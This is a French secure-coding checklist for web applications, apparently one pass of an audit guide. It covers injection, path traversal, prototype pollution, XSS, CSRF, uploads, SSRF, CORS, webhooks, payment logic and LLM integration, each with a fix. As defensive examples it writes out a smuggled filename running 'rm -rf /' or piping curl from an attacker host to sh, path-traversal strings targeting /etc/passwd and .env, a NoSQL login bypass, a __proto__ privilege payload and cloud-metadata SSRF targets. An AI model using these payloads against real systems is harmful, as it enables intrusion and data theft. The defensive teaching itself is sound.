# Passe 3 — Entrées, API et injections

Tout ce qui vient du navigateur est hostile jusqu'à preuve du contraire : body, query, en-têtes, cookies, noms de fichiers, contenu des fichiers.

---

## 3.1 Validation côté serveur

**La faille.** La validation existe uniquement dans le formulaire React. Un appel direct à l'API contourne tout : chaîne de 10 Mo, email invalide, quantité négative, prix modifié.

**Le correctif.** Un schéma de validation exécuté **côté serveur**, en première ligne du handler, avant toute requête en base :

```ts
const schema = z.object({
  email: z.string().email().max(254),
  quantite: z.number().int().positive().max(100),
}).strict()

const parsed = schema.safeParse(await request.json())
if (!parsed.success) return Response.json({ error: 'Requête invalide' }, { status: 400 })
```

Points souvent oubliés : longueur maximale sur chaque chaîne, bornes sur les nombres, `.strict()` pour rejeter les champs inconnus, limite de taille du body (`bodyParser` limité à quelques centaines de Ko), et pagination bornée (`limit` plafonné à 100, sinon `?limit=999999` aspire la base).

---

## 3.2 Injection SQL / NoSQL

**Détecter.** Chercher toute requête construite par concaténation ou template :

```js
`SELECT * FROM users WHERE email = '${email}'`
db.query("... WHERE id = " + id)
knex.raw(`... ${input}`)
```

**Le correctif.** Requêtes paramétrées, toujours :

```js
db.query('SELECT * FROM users WHERE email = $1', [email])
```

Un ORM (Prisma, Drizzle, Eloquent) paramètre par défaut — mais `$queryRawUnsafe`, `raw()` et `whereRaw()` ne le font pas. Les chercher spécifiquement.

MongoDB : un objet passé tel quel permet l'injection d'opérateurs (`{"password": {"$ne": null}}` connecte sans mot de passe). Valider que les champs reçus sont bien des chaînes avant de les mettre dans un filtre.

---

## 3.2 bis Injection de commande, traversée de chemin, pollution de prototype

Trois injections moins connues que SQL, mais aussi destructrices — et fréquentes dans le code généré.

### Injection de commande

**La faille.** Une entrée utilisateur atteint le shell. C'est l'exécution de code arbitraire sur le serveur, la fin de partie.

**Détecter.**

```
exec(          child_process.exec
execSync(      spawn( ... { shell: true })
shell_exec(    system(    passthru(    popen(
os.system(     subprocess.run(..., shell=True)
```

Le motif dangereux est la concaténation : `exec('convert ' + fichier)`. Un nom de fichier contenant `; rm -rf /` ou `$(curl attaquant.fr|sh)` suffit.

**Le correctif.** Ne pas passer par un shell. `execFile` ou `spawn` avec un tableau d'arguments, sans `shell: true` :

```js
// Faux
exec(`convert ${entree} sortie.png`)

// Juste — les arguments ne sont pas réinterprétés
execFile('convert', [entree, 'sortie.png'])
```

Mieux encore : utiliser une bibliothèque native (sharp plutôt qu'ImageMagick en ligne de commande) et n'accepter que des valeurs issues d'une liste blanche.

### Traversée de chemin

**La faille.** Un nom de fichier fourni par l'utilisateur sert à construire un chemin. Avec `../../../etc/passwd` ou `../../.env`, l'attaquant lit ce qu'il veut hors du dossier prévu — et, en écriture, écrase un fichier de configuration.

**Détecter.** Tout `path.join`, `readFile`, `createReadStream`, `unlink` ou `sendFile` dont un segment vient d'une requête.

**Le correctif.** Résoudre le chemin, puis **vérifier qu'il reste dans le dossier autorisé** :

```js
const racine = path.resolve('./televerses')
const cible = path.resolve(racine, path.basename(nomFourni))
if (!cible.startsWith(racine + path.sep)) {
  return new Response('Interdit', { status: 403 })
}
```

`path.basename` seul ne suffit pas toujours (encodage URL, octet nul, séparateurs Windows) : la vérification de préfixe après résolution est ce qui tient. Le mieux reste de ne jamais laisser un nom de fichier utilisateur entrer dans un chemin — stocker un identifiant en base et retrouver le chemin réel depuis là.

### Pollution de prototype

**La faille.** Une fusion récursive d'objets (`merge`, `extend`, `Object.assign` profond, `set` par chemin) accepte une clé `__proto__` ou `constructor.prototype`. L'attaquant modifie alors le prototype de tous les objets de l'application : `{"__proto__": {"isAdmin": true}}` et chaque objet du processus se met à répondre `isAdmin === true`.

**Détecter.** Les fusions maison, `lodash.merge` ancien, `deepmerge`, la construction d'objets par chemin, et le parsing de query strings imbriquées.

**Le correctif.** Rejeter les clés `__proto__`, `constructor` et `prototype` avant toute fusion ; utiliser `Object.create(null)` pour les dictionnaires ; valider avec un schéma strict (`.strict()` en Zod) qui refuse les clés inconnues — ce qui règle le problème à la source.

### Désérialisation dangereuse

Ne jamais désérialiser une donnée non fiable vers un objet exécutable : `eval`, `new Function`, `vm.runInNewContext`, `JSON.parse` suivi d'une reconstruction dynamique de classe, `unserialize()` en PHP, `pickle` en Python, YAML chargé en mode non sûr (`yaml.load` sans `SafeLoader`).

Un JSON parsé simplement ne pose pas de problème ; c'est ce qu'on en fait ensuite qui en pose.

---

## 3.3 XSS

**La faille.** Du contenu fourni par un utilisateur est injecté dans le HTML sans échappement, et le JavaScript qu'il contient s'exécute chez les autres visiteurs. Combiné à un token dans le localStorage (passe 1.1), c'est le vol de compte direct.

**Détecter.**

```
dangerouslySetInnerHTML
v-html
innerHTML =
document.write
{!! ... !!}   (Blade)
| safe        (Jinja/Nunjucks)
eval(
new Function(
```

**Le correctif.**

- Laisser le framework échapper. React, Vue, Svelte échappent par défaut ; le danger est uniquement dans les échappatoires ci-dessus.
- Si du HTML riche est nécessaire (éditeur de texte, contenu CMS) : assainir avec **DOMPurify** côté serveur, avec une liste blanche de balises et d'attributs.
- Ne jamais injecter de données utilisateur dans une balise `<script>`, un attribut `href` (`javascript:`), ou un gestionnaire d'événement inline.
- Poser une **Content-Security-Policy** (voir passe 5) : c'est le filet de sécurité quand un échappement est oublié.

---

## 3.4 CSRF

**La faille.** Un site tiers déclenche une requête authentifiée vers ton app : le navigateur envoie automatiquement le cookie de session. Résultat : action effectuée à l'insu de l'utilisateur (changement d'email, virement, suppression).

Cette faille apparaît **quand on passe le token en cookie**. Si tu viens d'appliquer la passe 1.1, tu dois traiter celle-ci.

**Le correctif.**

- `sameSite: 'lax'` sur le cookie de session couvre la majorité des cas (bloque les POST cross-site).
- Pour les actions sensibles, ajouter un token anti-CSRF : généré côté serveur, envoyé dans un champ caché ou un en-tête, vérifié à la réception. Le pattern « double submit cookie » est acceptable ; le token en session est plus sûr.
- Vérifier l'en-tête `Origin` sur les requêtes mutantes.
- Ne jamais accepter de mutation en `GET`.

Next.js Server Actions inclut une protection d'origine ; NextAuth/Auth.js gère le CSRF sur ses propres routes, mais **pas sur les tiennes**.

---

## 3.5 Upload de fichiers

**La faille.** L'upload accepte n'importe quoi, n'importe quelle taille, et sert le fichier depuis le même domaine. Un `.php` ou `.html` uploadé et servi devient du code exécuté ou une XSS stockée sur ton domaine.

**Le correctif.**

- Valider le **type réel** par les octets d'en-tête (magic bytes), jamais par l'extension ni par le `Content-Type` déclaré, tous deux falsifiables.
- Liste blanche stricte d'extensions et de types MIME.
- Taille maximale imposée côté serveur (pas seulement `accept` dans le HTML).
- **Renommer** le fichier avec un identifiant aléatoire ; ne jamais réutiliser le nom fourni (traversée de chemin via `../../`, caractères nuls, doubles extensions `photo.jpg.php`).
- Stocker **hors de la racine web**, idéalement sur un stockage objet (S3, R2, Supabase Storage) sur un **domaine distinct**, servi avec `Content-Disposition: attachment` pour les types non-images.
- Ré-encoder les images (sharp) : ça supprime les charges utiles cachées et les métadonnées EXIF, dont la géolocalisation.
- Contrôler les quotas par utilisateur.
- Si un antivirus est possible (ClamAV), scanner les fichiers destinés à être partagés.

---

## 3.6 SSRF

**La faille.** L'app va chercher une URL fournie par l'utilisateur (aperçu de lien, import depuis une URL, webhook configurable, génération de PDF depuis une page). L'attaquant fournit `http://169.254.169.254/` (métadonnées cloud, avec les identifiants du serveur) ou `http://localhost:6379` (Redis interne).

**Le correctif.** Liste blanche de domaines si possible. Sinon : résoudre le DNS, refuser toute IP privée, locale, ou de lien-local (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, ::1), refuser les redirections vers ces plages, et fixer un timeout court. Ne jamais suivre plus de deux redirections.

---

## 3.7 Redirection ouverte

`?next=`, `?redirect=`, `?returnUrl=` utilisés tels quels après connexion permettent d'envoyer l'utilisateur sur un site de phishing depuis un lien qui commence par ton domaine.

Correctif : n'accepter que des chemins relatifs commençant par `/` (et pas `//`), ou une liste blanche d'URL absolues.

---

## 3.8 CORS

**La faille.** `Access-Control-Allow-Origin: *` combiné à `Access-Control-Allow-Credentials: true` — configuration invalide mais que certains serveurs appliquent partiellement — ou une vérification d'origine par `startsWith` / `includes` qui laisse passer `monsite.com.attaquant.fr`.

**Le correctif.** Liste blanche d'origines exactes, comparaison stricte d'égalité. Pas de joker dès qu'il y a des credentials. Limiter les méthodes et les en-têtes autorisés.

---

## 3.9 Rate limiting global de l'API

Le rate limit de la passe 1.3 protège la connexion. Il en faut un sur **toute** l'API :

- formulaires de contact et newsletter → sinon spam et blacklist de ton domaine d'envoi
- routes coûteuses (recherche, export, génération de PDF, appels à un LLM) → sinon facture ou serveur à terre
- routes de lecture publiques → sinon aspiration complète du contenu

Le plus simple sur un petit projet : les règles de rate limiting de Cloudflare devant le site, en complément du rate limit applicatif.

---

## 3.10 Webhooks

Un endpoint de webhook est une route publique par définition. Sans vérification, n'importe qui peut envoyer un faux « paiement réussi ».

- Vérifier la **signature** (`stripe.webhooks.constructEvent` avec le secret, `X-Hub-Signature-256` pour GitHub) en comparaison à temps constant.
- Utiliser le **corps brut** de la requête pour la vérification, pas le JSON re-sérialisé.
- Vérifier l'horodatage pour refuser les rejeux.
- Traiter l'événement de façon idempotente (le même événement peut arriver deux fois).

---

## 3.11 Logique métier et paiement

Règle unique : **le serveur ne fait jamais confiance à un montant, un prix, une quantité ou un statut envoyé par le client.**

- Le prix est relu en base à partir de l'identifiant du produit, jamais pris dans le panier envoyé.
- Les remises et codes promo sont validés côté serveur (existence, validité, cumul, usage unique).
- Le passage à « payé » vient du webhook du prestataire de paiement, jamais d'un retour sur la page de succès (l'utilisateur peut ouvrir l'URL de succès directement).
- Vérifier le stock et les quantités négatives.
- Les opérations d'argent sont idempotentes et transactionnelles.

---

## 3.12 Si l'app intègre un LLM

- Les instructions système ne doivent jamais contenir de secret : elles peuvent être extraites.
- Le contenu externe (page web, document, message d'un autre utilisateur) inséré dans un prompt est une **donnée non fiable** : il peut contenir des instructions. Ne jamais laisser un LLM déclencher une action sensible sur la seule base d'un contenu externe.
- Plafonner les tokens par requête et par utilisateur, sinon la facture API est une faille financière.
- Filtrer les sorties avant de les afficher en HTML (XSS via réponse du modèle).
- Ne pas envoyer de données personnelles à un fournisseur tiers sans base légale et sans le mentionner dans la politique de confidentialité (voir passe 6).
